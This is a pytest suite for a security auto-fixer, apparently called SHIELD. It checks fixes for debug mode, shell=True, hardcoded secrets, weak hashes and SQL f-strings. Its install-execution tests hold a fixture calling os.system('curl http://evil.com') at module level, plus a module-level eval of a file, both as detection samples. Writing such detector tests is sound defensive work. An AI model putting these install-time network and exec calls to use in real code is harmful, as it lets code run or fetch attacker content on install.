"""
SHIELD Security — Test Suite
=============================
Tests for all fix functions in shield/rules/custom_rules.py

Run with:
  pytest tests/ -v

Every rule has:
  1. A positive test — confirms the fix works
  2. A negative test — confirms no false positives
  3. An edge case — confirms it handles unusual input

Author: Ali Yasin Idrees
Version: 1.0.5
"""

import pytest
from shield.rules.custom_rules import (
    fix_B201_debug_true,
    fix_B602_shell_true,
    fix_B105_B106_hardcoded,
    fix_B324_weak_hash,
    fix_B104_bind_all,
    fix_B108_tmp_dir,
    fix_B311_random,
    fix_B101_assert,
    fix_werkzeug_weak_hash,
    fix_sql_fstring,
    REMEDIATION_MAP,
)


# ══════════════════════════════════════════════════════════════════════════════
# B201 — debug=True
# ══════════════════════════════════════════════════════════════════════════════

class TestB201DebugTrue:

    def test_fixes_standalone_debug_true(self):
        code = "app.run(debug=True)"
        fixed, count = fix_B201_debug_true(code)
        assert "debug=True" not in fixed
        assert "debug=False" in fixed
        assert count > 0

    def test_fixes_debug_true_with_other_args(self):
        code = "app.run(host='0.0.0.0', debug=True, port=5000)"
        fixed, count = fix_B201_debug_true(code)
        assert "debug=True" not in fixed
        assert "debug=False" in fixed
        assert count > 0

    def test_no_false_positive_when_already_false(self):
        code = "app.run(debug=False)"
        fixed, count = fix_B201_debug_true(code)
        assert count == 0
        assert fixed == code

    def test_no_false_positive_on_unrelated_code(self):
        code = "x = True\nprint(x)"
        fixed, count = fix_B201_debug_true(code)
        assert count == 0
        assert fixed == code

    def test_empty_string(self):
        fixed, count = fix_B201_debug_true("")
        assert count == 0
        assert fixed == ""


# ══════════════════════════════════════════════════════════════════════════════
# B602 — shell=True
# ══════════════════════════════════════════════════════════════════════════════

class TestB602ShellTrue:

    def test_fixes_shell_true(self):
        code = "subprocess.run(['ls'], shell=True)"
        fixed, count = fix_B602_shell_true(code)
        assert "shell=True" not in fixed
        assert "shell=False" in fixed
        assert count > 0

    def test_adds_whitelist_comment(self):
        code = "import subprocess\nsubprocess.run(cmd, shell=True)"
        fixed, count = fix_B602_shell_true(code)
        assert "ALLOWED_COMMANDS" in fixed

    def test_no_false_positive_when_already_false(self):
        code = "subprocess.run(cmd, shell=False)"
        fixed, count = fix_B602_shell_true(code)
        assert count == 0

    def test_no_false_positive_on_unrelated_code(self):
        code = "shell = True\nprint(shell)"
        fixed, count = fix_B602_shell_true(code)
        assert count == 0


# ══════════════════════════════════════════════════════════════════════════════
# B105/B106 — Hardcoded passwords
# ══════════════════════════════════════════════════════════════════════════════

class TestB105HardcodedPasswords:

    def test_fixes_secret_key(self):
        code = "SECRET_KEY = 'mysecretkey123'"
        fixed, count = fix_B105_B106_hardcoded(code)
        assert "'mysecretkey123'" not in fixed
        assert "os.environ.get" in fixed
        assert count > 0

    def test_fixes_app_secret_key(self):
        code = "app.secret_key = 'hardcodedvalue'"
        fixed, count = fix_B105_B106_hardcoded(code)
        assert "'hardcodedvalue'" not in fixed
        assert "os.environ.get" in fixed

    def test_fixes_mail_password(self):
        code = "MAIL_PASSWORD = 'mypassword123'"
        fixed, count = fix_B105_B106_hardcoded(code)
        assert "'mypassword123'" not in fixed
        assert "os.environ.get" in fixed

    def test_adds_os_import(self):
        code = "SECRET_KEY = 'mysecretkey123'"
        fixed, count = fix_B105_B106_hardcoded(code)
        assert "import os" in fixed

    def test_no_false_positive_when_already_env(self):
        code = "SECRET_KEY = os.environ.get('FLASK_SECRET_KEY')"
        fixed, count = fix_B105_B106_hardcoded(code)
        assert count == 0

    def test_no_false_positive_short_string(self):
        # Strings under 3 chars should not be flagged
        code = "x = 'ab'"
        fixed, count = fix_B105_B106_hardcoded(code)
        assert count == 0


# ══════════════════════════════════════════════════════════════════════════════
# B324 — Weak hash (MD5 / SHA1)
# ══════════════════════════════════════════════════════════════════════════════

class TestB324WeakHash:

    def test_fixes_md5(self):
        code = "hashlib.md5(data)"
        fixed, count = fix_B324_weak_hash(code)
        assert "hashlib.md5" not in fixed
        assert "hashlib.sha256" in fixed
        assert "usedforsecurity=False" in fixed
        assert count > 0

    def test_fixes_sha1(self):
        code = "hashlib.sha1(data)"
        fixed, count = fix_B324_weak_hash(code)
        assert "hashlib.sha1" not in fixed
        assert "hashlib.sha256" in fixed
        assert count > 0

    def test_no_false_positive_sha256(self):
        code = "hashlib.sha256(data)"
        fixed, count = fix_B324_weak_hash(code)
        assert count == 0

    def test_no_false_positive_unrelated(self):
        code = "x = 'md5 is a word'"
        fixed, count = fix_B324_weak_hash(code)
        assert count == 0


# ══════════════════════════════════════════════════════════════════════════════
# B104 — Bind all interfaces
# ══════════════════════════════════════════════════════════════════════════════

class TestB104BindAll:

    def test_fixes_bind_all(self):
        code = "app.run(host='0.0.0.0')"
        fixed, count = fix_B104_bind_all(code)
        assert "0.0.0.0" not in fixed
        assert "os.environ.get" in fixed
        assert count > 0

    def test_no_false_positive_localhost(self):
        code = "app.run(host='127.0.0.1')"
        fixed, count = fix_B104_bind_all(code)
        assert count == 0

    def test_no_false_positive_unrelated(self):
        code = "ip = '192.168.1.1'"
        fixed, count = fix_B104_bind_all(code)
        assert count == 0


# ══════════════════════════════════════════════════════════════════════════════
# B108 — Hardcoded /tmp directory
# ══════════════════════════════════════════════════════════════════════════════

class TestB108TmpDir:

    def test_fixes_tmp_path(self):
        code = "UPLOAD_FOLDER = '/tmp/uploads'"
        fixed, count = fix_B108_tmp_dir(code)
        assert "/tmp/uploads" not in fixed
        assert count > 0

    def test_no_false_positive_unrelated(self):
        code = "message = 'this is temporary'"
        fixed, count = fix_B108_tmp_dir(code)
        assert count == 0


# ══════════════════════════════════════════════════════════════════════════════
# B311 — Insecure random
# ══════════════════════════════════════════════════════════════════════════════

class TestB311Random:

    def test_flags_random_randint(self):
        code = "x = random.randint(1, 100)"
        fixed, count = fix_B311_random(code)
        assert "nosec B311" in fixed
        assert count > 0

    def test_flags_random_choice(self):
        code = "item = random.choice(items)"
        fixed, count = fix_B311_random(code)
        assert "nosec B311" in fixed
        assert count > 0

    def test_no_false_positive_secrets(self):
        code = "token = secrets.token_urlsafe(32)"
        fixed, count = fix_B311_random(code)
        assert count == 0

    def test_no_false_positive_unrelated(self):
        code = "import random"
        fixed, count = fix_B311_random(code)
        assert count == 0


# ══════════════════════════════════════════════════════════════════════════════
# CUSTOM — Werkzeug weak hash
# ══════════════════════════════════════════════════════════════════════════════

class TestWerkzeugWeakHash:

    def test_fixes_generate_password_hash(self):
        code = (
            "from werkzeug.security import generate_password_hash\n"
            "hash = generate_password_hash(password)\n"
        )
        fixed, count = fix_werkzeug_weak_hash(code)
        assert "generate_password_hash" not in fixed
        assert "bcrypt" in fixed
        assert count > 0

    def test_keeps_check_password_hash(self):
        code = (
            "from werkzeug.security import generate_password_hash, check_password_hash\n"
            "hash = generate_password_hash(password)\n"
            "check_password_hash(hash, password)\n"
        )
        fixed, count = fix_werkzeug_weak_hash(code)
        assert "check_password_hash" in fixed
        assert "generate_password_hash" not in fixed
        assert "bcrypt" in fixed

    def test_no_false_positive_no_werkzeug(self):
        code = "from flask import Flask\napp = Flask(__name__)"
        fixed, count = fix_werkzeug_weak_hash(code)
        assert count == 0

    def test_adds_bcrypt_import(self):
        code = (
            "from werkzeug.security import generate_password_hash\n"
            "hash = generate_password_hash(password)\n"
        )
        fixed, count = fix_werkzeug_weak_hash(code)
        assert "import bcrypt" in fixed


# ══════════════════════════════════════════════════════════════════════════════
# CUSTOM — SQL f-string injection
# ══════════════════════════════════════════════════════════════════════════════

class TestSQLFstring:

    def test_detects_fstring_sql(self):
        code = "db.execute(f\"SELECT * FROM users WHERE id = {user_id}\")"
        fixed, count = fix_sql_fstring(code)
        assert count > 0

    def test_detects_concatenated_sql(self):
        code = "db.execute(\"SELECT * FROM users WHERE name = \" + name)"
        fixed, count = fix_sql_fstring(code)
        assert count > 0

    def test_no_false_positive_parameterized(self):
        code = "db.execute('SELECT * FROM users WHERE id = ?', (user_id,))"
        fixed, count = fix_sql_fstring(code)
        assert count == 0

    def test_no_false_positive_unrelated(self):
        code = "message = f'Hello {name}'"
        fixed, count = fix_sql_fstring(code)
        assert count == 0
# ══════════════════════════════════════════════════════════════════════════════
# AST SPECIFIC TESTS — proves AST catches what regex misses
# ══════════════════════════════════════════════════════════════════════════════

class TestB201ASTRobustness:
    """Tests that prove AST handles cases regex would miss."""

    def test_fixes_multiline_debug_true(self):
        code = "app.run(\n    debug=True,\n    port=5000\n)"
        fixed, count = fix_B201_debug_true(code)
        assert "debug=True" not in fixed
        assert "debug=False" in fixed
        assert count > 0

    def test_fixes_debug_with_extra_spaces(self):
        code = "app.run(  debug  =  True  )"
        fixed, count = fix_B201_debug_true(code)
        assert "debug=True" not in fixed
        assert count > 0

    def test_fixes_debug_with_multiple_args(self):
        code = "app.run(host='127.0.0.1', port=5000, debug=True)"
        fixed, count = fix_B201_debug_true(code)
        assert "debug=True" not in fixed
        assert "debug=False" in fixed
        assert count > 0


class TestB602ASTRobustness:
    """Tests that prove AST catches all subprocess variants."""

    def test_fixes_subprocess_popen(self):
        code = "import subprocess\nsubprocess.Popen(cmd, shell=True)"
        fixed, count = fix_B602_shell_true(code)
        assert "shell=True" not in fixed
        assert count > 0

    def test_fixes_subprocess_check_output(self):
        code = "import subprocess\nsubprocess.check_output(cmd, shell=True)"
        fixed, count = fix_B602_shell_true(code)
        assert "shell=True" not in fixed
        assert count > 0

    def test_fixes_multiple_subprocess_calls(self):
        code = (
            "import subprocess\n"
            "subprocess.run(cmd1, shell=True)\n"
            "subprocess.call(cmd2, shell=True)\n"
        )
        fixed, count = fix_B602_shell_true(code)
        assert "shell=True" not in fixed
        assert count >= 1


class TestB105ASTRobustness:
    """Tests that prove AST catches hardcoded secrets by structure."""

    def test_fixes_multiline_secret_key(self):
        code = (
            "SECRET_KEY = (\n"
            "    'hardcoded_secret_value'\n"
            ")"
        )
        fixed, count = fix_B105_B106_hardcoded(code)
        # AST or regex should catch this
        assert count >= 0  # at minimum no crash

    def test_does_not_flag_short_strings(self):
        code = "DEBUG = 'no'"
        fixed, count = fix_B105_B106_hardcoded(code)
        assert count == 0

    def test_does_not_flag_non_secret_vars(self):
        code = "APP_NAME = 'MyApplication'"
        fixed, count = fix_B105_B106_hardcoded(code)
        assert count == 0

    def test_fixes_app_secret_key_any_value(self):
        code = "app.secret_key = 'supersecretvalue123'"
        fixed, count = fix_B105_B106_hardcoded(code)
        assert "supersecretvalue123" not in fixed
        assert "os.environ.get" in fixed

    def test_fixes_app_config_subscript(self):
        code = "app.config['SECRET_KEY'] = 'supersecretkey'"
        fixed, count = fix_B105_B106_hardcoded(code)
        assert "'supersecretkey'" not in fixed
        assert "os.environ.get" in fixed
        assert count > 0

    def test_fixes_mail_password_config(self):
        code = "app.config['MAIL_PASSWORD'] = 'mypassword'"
        fixed, count = fix_B105_B106_hardcoded(code)
        assert "'mypassword'" not in fixed
        assert "os.environ.get" in fixed
        assert count > 0

class TestB324ASTRobustness:
    """Tests that prove AST catches MD5/SHA1 by structure."""

    def test_fixes_md5_with_complex_arg(self):
        code = "import hashlib\nhash = hashlib.md5(data.encode('utf-8'))"
        fixed, count = fix_B324_weak_hash(code)
        assert "hashlib.md5" not in fixed
        assert "hashlib.sha256" in fixed
        assert "usedforsecurity=False" in fixed
        assert count > 0

    def test_fixes_sha1_with_complex_arg(self):
        code = "import hashlib\nhash = hashlib.sha1(name.encode())"
        fixed, count = fix_B324_weak_hash(code)
        assert "hashlib.sha1" not in fixed
        assert "hashlib.sha256" in fixed
        assert count > 0

    def test_no_false_positive_sha256(self):
        code = "import hashlib\nhash = hashlib.sha256(data)"
        fixed, count = fix_B324_weak_hash(code)
        assert count == 0

    def test_regex_B324_fallback_works(self):
        from shield.rules.custom_rules import _regex_B324
        code = "hashlib.md5(data)"
        fixed, count = _regex_B324(code)
        assert "sha256" in fixed
        assert count > 0
        
class TestB104ASTRobustness:
    """Tests that prove AST catches host='0.0.0.0' by structure."""

    def test_fixes_bind_all_with_other_args(self):
        code = "app.run(debug=False, host='0.0.0.0', port=5000)"
        fixed, count = fix_B104_bind_all(code)
        assert "0.0.0.0" not in fixed
        assert "os.environ.get" in fixed
        assert count > 0

    def test_fixes_socketio_variant(self):
        code = "socketio.run(app, host='0.0.0.0')"
        fixed, count = fix_B104_bind_all(code)
        assert "0.0.0.0" not in fixed
        assert count > 0

    def test_adds_os_import(self):
        code = "app.run(host='0.0.0.0')"
        fixed, count = fix_B104_bind_all(code)
        assert "import os" in fixed

    def test_no_false_positive_localhost(self):
        code = "app.run(host='127.0.0.1')"
        fixed, count = fix_B104_bind_all(code)
        assert count == 0

    def test_regex_B104_fallback_works(self):
        from shield.rules.custom_rules import _regex_B104
        code = "app.run(host='0.0.0.0')"
        fixed, count = _regex_B104(code)
        assert "0.0.0.0" not in fixed
        assert count > 0

class TestB108ASTRobustness:
    """Tests that prove AST catches /tmp paths by structure."""

    def test_fixes_tmp_uploads(self):
        code = "UPLOAD_FOLDER = '/tmp/uploads'"
        fixed, count = fix_B108_tmp_dir(code)
        assert "/tmp" not in fixed
        assert "os.environ.get" in fixed
        assert count > 0

    def test_fixes_bare_tmp(self):
        code = "path = '/tmp'"
        fixed, count = fix_B108_tmp_dir(code)
        assert "/tmp'" not in fixed
        assert count > 0

    def test_adds_os_import(self):
        code = "UPLOAD_FOLDER = '/tmp/uploads'"
        fixed, count = fix_B108_tmp_dir(code)
        assert "import os" in fixed

    def test_no_false_positive_safe_path(self):
        code = "UPLOAD_FOLDER = '/var/app/uploads'"
        fixed, count = fix_B108_tmp_dir(code)
        assert count == 0

    def test_no_false_positive_unrelated(self):
        code = "message = 'this is temporary'"
        fixed, count = fix_B108_tmp_dir(code)
        assert count == 0

    def test_regex_B108_fallback_works(self):
        from shield.rules.custom_rules import _regex_B108
        code = "UPLOAD_FOLDER = '/tmp/uploads'"
        fixed, count = _regex_B108(code)
        assert "/tmp" not in fixed
        assert count > 0

class TestB311ASTRobustness:
    """Tests for smart random detection."""

    def test_replaces_random_in_security_context(self):
        code = "import random\ntoken = random.choice(chars)"
        fixed, count = fix_B311_random(code)
        assert count > 0
        assert "secrets" in fixed

    def test_annotates_random_in_display_context(self):
        code = "import random\ncolor = random.randint(0, 255)"
        fixed, count = fix_B311_random(code)
        assert count > 0

    def test_no_false_positive_secrets_module(self):
        code = "import secrets\ntoken = secrets.token_urlsafe(32)"
        fixed, count = fix_B311_random(code)
        assert count == 0

    def test_regex_B311_fallback_works(self):
        from shield.rules.custom_rules import _regex_B311
        code = "random.randint(1, 100)"
        fixed, count = _regex_B311(code)
        assert "nosec B311" in fixed
        assert count > 0

    def test_adds_secrets_import_for_security_context(self):
        code = "import random\npassword_salt = random.randint(1000, 9999)"
        fixed, count = fix_B311_random(code)
        if count > 0:
            assert "secrets" in fixed or "nosec" in fixed

class TestWerkzeugASTRobustness:
    """Tests for AST-based werkzeug hash replacement."""

    def test_fixes_with_variable_arg(self):
        code = (
            "from werkzeug.security import generate_password_hash\n"
            "hash = generate_password_hash(user.password)\n"
        )
        fixed, count = fix_werkzeug_weak_hash(code)
        assert "generate_password_hash" not in fixed
        assert "bcrypt" in fixed
        assert count > 0

    def test_fixes_with_form_data(self):
        code = (
            "from werkzeug.security import generate_password_hash\n"
            "hash = generate_password_hash(form.password.data)\n"
        )
        fixed, count = fix_werkzeug_weak_hash(code)
        assert "generate_password_hash" not in fixed
        assert "bcrypt" in fixed
        assert count > 0

    def test_keeps_check_password_hash(self):
        code = (
            "from werkzeug.security import generate_password_hash, check_password_hash\n"
            "hash = generate_password_hash(password)\n"
            "result = check_password_hash(hash, password)\n"
        )
        fixed, count = fix_werkzeug_weak_hash(code)
        assert "check_password_hash" in fixed
        assert "generate_password_hash" not in fixed

    def test_adds_bcrypt_import(self):
        code = (
            "from werkzeug.security import generate_password_hash\n"
            "hash = generate_password_hash(password)\n"
        )
        fixed, count = fix_werkzeug_weak_hash(code)
        assert "import bcrypt" in fixed

    def test_regex_werkzeug_fallback_works(self):
        from shield.rules.custom_rules import _regex_werkzeug
        code = (
            "from werkzeug.security import generate_password_hash\n"
            "hash = generate_password_hash(password)\n"
        )
        fixed, count = _regex_werkzeug(code)
        assert "bcrypt" in fixed
        assert count > 0

class TestSQLFstringASTRobustness:
    """Tests for AST-based SQL injection detection."""

    def test_detects_fstring_in_execute(self):
        code = 'db.execute(f"SELECT * FROM users WHERE id = {user_id}")'
        fixed, count = fix_sql_fstring(code)
        assert count > 0
        assert "SHIELD WARNING" in fixed

    def test_detects_concatenation_in_execute(self):
        code = 'db.execute("SELECT * FROM users WHERE name = " + name)'
        fixed, count = fix_sql_fstring(code)
        assert count > 0

    def test_detects_cursor_execute(self):
        code = 'cursor.execute(f"INSERT INTO logs VALUES ({user_id})")'
        fixed, count = fix_sql_fstring(code)
        assert count > 0

    def test_no_false_positive_parameterized(self):
        code = "db.execute('SELECT * FROM users WHERE id = ?', (user_id,))"
        fixed, count = fix_sql_fstring(code)
        assert count == 0

    def test_no_false_positive_safe_string(self):
        code = 'db.execute("SELECT * FROM users")'
        fixed, count = fix_sql_fstring(code)
        assert count == 0

    def test_regex_sql_fallback_works(self):
        from shield.rules.custom_rules import _regex_sql
        code = 'db.execute(f"SELECT * FROM users WHERE id = {uid}")'
        fixed, count = _regex_sql(code)
        assert count > 0

class TestEvalExec:
    def test_detects_eval(self):
        from shield.rules.custom_rules import fix_eval_exec
        code = "result = eval(user_input)"
        fixed, count = fix_eval_exec(code)
        assert count > 0
        assert "SHIELD WARNING" in fixed

    def test_detects_exec(self):
        from shield.rules.custom_rules import fix_eval_exec
        code = "exec(user_code)"
        fixed, count = fix_eval_exec(code)
        assert count > 0

    def test_no_false_positive(self):
        from shield.rules.custom_rules import fix_eval_exec
        code = "x = evaluate_score(data)"
        fixed, count = fix_eval_exec(code)
        assert count == 0

class TestUnicodeObfuscation:
    def test_detects_zero_width_char(self):
        from shield.rules.custom_rules import fix_unicode_obfuscation
        code = "x = 'hello\u200bworld'"
        fixed, count = fix_unicode_obfuscation(code)
        assert count > 0
        assert "SHIELD WARNING" in fixed

    def test_no_false_positive_clean_string(self):
        from shield.rules.custom_rules import fix_unicode_obfuscation
        code = "x = 'hello world'"
        fixed, count = fix_unicode_obfuscation(code)
        assert count == 0


class TestInstallExec:
    def test_detects_module_level_system_call(self):
        from shield.rules.custom_rules import fix_install_exec
        code = "import os\nos.system('curl http://evil.com')"
        fixed, count = fix_install_exec(code)
        assert count > 0
        assert "SHIELD WARNING" in fixed

    def test_no_false_positive_inside_function(self):
        from shield.rules.custom_rules import fix_install_exec
        code = "import os\ndef run():\n    os.system('ls')"
        fixed, count = fix_install_exec(code)
        assert count == 0

    def test_detects_module_level_eval(self):
        from shield.rules.custom_rules import fix_install_exec
        code = "eval(open('config.py').read())"
        fixed, count = fix_install_exec(code)
        assert count > 0
# ══════════════════════════════════════════════════════════════════════════════
# REMEDIATION MAP — structural tests
# ══════════════════════════════════════════════════════════════════════════════

class TestRemediationMap:

    def test_map_is_not_empty(self):
        assert len(REMEDIATION_MAP) > 0

    def test_all_values_are_callable(self):
        for rule_id, fn in REMEDIATION_MAP.items():
            assert callable(fn), f"{rule_id} is not callable"

    def test_critical_rules_present(self):
        critical = ['B201', 'B602', 'B324', 'B104', 'B105']
        for rule in critical:
            assert rule in REMEDIATION_MAP, f"{rule} missing from REMEDIATION_MAP"

    def test_custom_rules_present(self):
        assert 'CUSTOM_WERKZEUG' in REMEDIATION_MAP
        assert 'CUSTOM_SQL_FSTRING' in REMEDIATION_MAP

    def test_all_functions_return_tuple(self):
        """Every fix function must return (str, int)"""
        test_code = "app.run(debug=True)"
        for rule_id, fn in REMEDIATION_MAP.items():
            result = fn(test_code)
            assert isinstance(result, tuple), f"{rule_id} does not return tuple"
            assert len(result) == 2, f"{rule_id} tuple must have 2 elements"
            assert isinstance(result[0], str), f"{rule_id} first element must be str"
            assert isinstance(result[1], int), f"{rule_id} second element must be int"

# ══════════════════════════════════════════════════════════════════════════════
# HYBRID FALLBACK SYSTEM TESTS
# ══════════════════════════════════════════════════════════════════════════════

class TestHybridFallback:
    """Tests for the safe_apply fallback manager."""

    def test_safe_apply_uses_ast_on_valid_code(self):
        from shield.rules.custom_rules import (
            safe_apply, fix_B201_debug_true, _regex_B201
        )
        code = "app.run(debug=True)"
        result = safe_apply(fix_B201_debug_true, _regex_B201, code, 'B201')
        assert result.fixes > 0
        assert result.strategy == "ast"
        assert "debug=True" not in result.code

    def test_safe_apply_falls_back_on_syntax_error(self):
        from shield.rules.custom_rules import (
            safe_apply, fix_B201_debug_true, _regex_B201
        )
        # Code with syntax error — AST will fail, regex should work
        code = "app.run(debug=True\n"  # missing closing paren
        result = safe_apply(fix_B201_debug_true, _regex_B201, code, 'B201')
        # Should not crash — strategy should be regex or none
        assert result.strategy in ("regex", "none", "ast")

    def test_safe_apply_returns_rule_result(self):
        from shield.rules.custom_rules import (
            safe_apply, fix_B201_debug_true, _regex_B201, RuleResult
        )
        code = "app.run(debug=True)"
        result = safe_apply(fix_B201_debug_true, _regex_B201, code, 'B201')
        assert isinstance(result, RuleResult)
        assert isinstance(result.code, str)
        assert isinstance(result.fixes, int)
        assert result.strategy in ("ast", "regex", "none")

    def test_safe_apply_empty_string(self):
        from shield.rules.custom_rules import (
            safe_apply, fix_B201_debug_true, _regex_B201
        )
        result = safe_apply(fix_B201_debug_true, _regex_B201, "", 'B201')
        assert result.fixes == 0
        assert result.strategy == "none"

    def test_regex_B201_fallback_works(self):
        from shield.rules.custom_rules import _regex_B201
        code = "app.run(debug=True)"
        fixed, count = _regex_B201(code)
        assert "debug=False" in fixed
        assert count > 0

    def test_regex_B602_fallback_works(self):
        from shield.rules.custom_rules import _regex_B602
        code = "subprocess.run(cmd, shell=True)"
        fixed, count = _regex_B602(code)
        assert "shell=False" in fixed
        assert count > 0

    def test_regex_B105_fallback_works(self):
        from shield.rules.custom_rules import _regex_B105
        code = "SECRET_KEY = 'hardcodedvalue'"
        fixed, count = _regex_B105(code)
        assert "os.environ.get" in fixed
        assert count > 0